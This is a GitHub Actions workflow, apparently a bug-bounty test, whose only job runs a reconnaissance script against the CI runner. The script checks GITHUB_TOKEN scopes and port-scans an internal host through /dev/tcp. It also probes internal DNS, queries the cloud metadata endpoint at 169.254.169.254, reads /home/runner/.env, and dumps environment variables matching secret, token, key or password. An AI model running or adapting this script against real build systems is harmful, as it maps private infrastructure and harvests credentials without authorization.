name: Deep
on: workflow_dispatch
jobs:
  deep:
    runs-on: ubuntu-latest
    steps:
      - run: |
          echo "=== DEEP RECON ==="
          echo "--- GITHUB_TOKEN PERMISSIONS ---"
          curl -sH "Authorization: token $GITHUB_TOKEN" https://api.github.com/repos/blooddiamondz/bb-rce-test 2>/dev/null | grep -E '"(permissions|full_name|private)"'
          echo "--- TOKEN SCOPES ---"
          curl -sI -H "Authorization: token $GITHUB_TOKEN" https://api.github.com/ 2>/dev/null | grep -iE '(x-oauth-scopes|x-accepted)'
          echo "--- NETWORK SCAN ---"
          for port in 80 443 8080 8443 9418 3000 5000; do
            (echo >/dev/tcp/10.1.0.1/$port) 2>/dev/null && echo "10.1.0.1:$port OPEN" || true
          done
          echo "--- DNS INTERNAL ---"
          dig +short github.com 2>/dev/null
          dig +short api.github.com 2>/dev/null
          nslookup babeld.service.consul 2>/dev/null || echo "no consul"
          nslookup github.net 2>/dev/null || echo "no github.net"
          echo "--- AZURE METADATA V2 ---"
          curl -sH "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>/dev/null | head -c 2000 || echo "blocked"
          echo "--- PROCESSES ---"
          ps aux | head -30
          echo "--- DOCKER ---"
          docker info 2>/dev/null | head -10 || echo "no docker access"
          echo "--- FILESYSTEM ---"
          ls -la /home/runner/ 2>/dev/null
          cat /home/runner/.env 2>/dev/null || echo "no .env"
          ls -la /etc/github/ 2>/dev/null || echo "no /etc/github"
          echo "--- SECRETS ENV ---"
          env | grep -iE '(secret|token|key|pass|cred)' | head -20
          echo "=== DEEP DONE ==="
